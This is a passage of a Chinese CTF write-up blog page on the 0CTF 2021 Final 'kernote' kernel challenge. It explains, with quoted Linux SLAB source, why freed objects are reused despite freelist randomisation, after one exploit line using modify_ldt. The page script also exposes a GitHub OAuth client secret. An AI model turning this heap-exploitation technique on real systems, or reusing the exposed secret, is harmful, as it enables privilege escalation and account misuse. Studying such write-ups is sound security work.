+    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先的猜想是 free_list 只有这么一个 object，随后我尝试了在 exp 开头通过 <code>fd = open(&quot;/proc/self/stat&quot;); close(fd);</code> 构造多个 seq_operations 并释放，最后发现 exp 仍可以正常 leak，看样子不是这个问题</p>
+<p>最后求助于源码，发现 slab 分配器在分配和释放时存在一个 cpu cache，分配和释放都会先操作这个 cache</p>
+<p>在调用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/mm/slab.c#L3031"><code>____cache_alloc</code></a> 时，可以发现 object 从 cpu cache 中分配</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">____cache_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> <span class="token class-name">gfp_t</span> flags<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac<span class="token punctuation">;</span>
+
+	<span class="token function">check_irq_off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>ac<span class="token operator">-></span>avail<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		ac<span class="token operator">-></span>touched <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+		objp <span class="token operator">=</span> ac<span class="token operator">-></span>entry<span class="token punctuation">[</span><span class="token operator">--</span>ac<span class="token operator">-></span>avail<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+		<span class="token function">STATS_INC_ALLOCHIT</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">return</span> objp<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>释放时，当 cpu_cache 满了，调用 <code>cache_flusharray</code> 把 cpu_cache 里的 object 扔到 slab free_list 里，最后再把当前要释放的 object 扔到 cpu_cache 里</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">___cache_free</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">,</span>
+		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>ac<span class="token operator">-></span>avail <span class="token operator">&lt;</span> ac<span class="token operator">-></span>limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">STATS_INC_FREEHIT</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">STATS_INC_FREEMISS</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">cache_flusharray</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> ac<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+	<span class="token function">__free_one</span><span class="token punctuation">(</span>ac<span class="token punctuation">,</span> objp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">__free_one</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token comment">/* Avoid trivial double-free. */</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IS_ENABLED</span><span class="token punctuation">(</span>CONFIG_SLAB_FREELIST_HARDENED<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+	    <span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span>ac<span class="token operator">-></span>avail <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ac<span class="token operator">-></span>entry<span class="token punctuation">[</span>ac<span class="token operator">-></span>avail <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> objp<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span><span class="token punctuation">;</span>
+	ac<span class="token operator">-></span>entry<span class="token punctuation">[</span>ac<span class="token operator">-></span>avail<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> objp<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>所以在这个过程中，分配的 object 一定是最后一次释放的 object，没有受到 SLAB_FREELIST_RANDOM 的影响</p>
+<p>于此同时也可以看到，slab 分配器的 SLAB_FREELIST_HARDENED 机制不同于文章开头对于 slub 分配器该机制描述的那样，更具体的内容可以自行查阅源码</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文中未明确提到的参考链接如下：</p>
+<ol>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote">https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/200161">https://www.anquanke.com/post/id/200161</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://cateee.net/lkddb/web-lkddb/HARDENED_USERCOPY.html">https://cateee.net/lkddb/web-lkddb/HARDENED_USERCOPY.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/pwl999/article/details/112055498">https://blog.csdn.net/pwl999/article/details/112055498</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>feather
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://www.xi4oyu.top/5b4f46e3/" title="2021-0CTF-FINAL-kernote">http://www.xi4oyu.top/5b4f46e3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/f6f424b7/" rel="prev" title="2021-inCTFi-Kqueue">
+                  <i class="fa fa-chevron-left"></i> 2021-inCTFi-Kqueue
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/cdcd3a27/" rel="next" title="2022-虎符CTF-hfdev">
+                  2022-虎符CTF-hfdev <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">feather</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">369k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"79d24b894c83709dc6ede009201ed05c"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
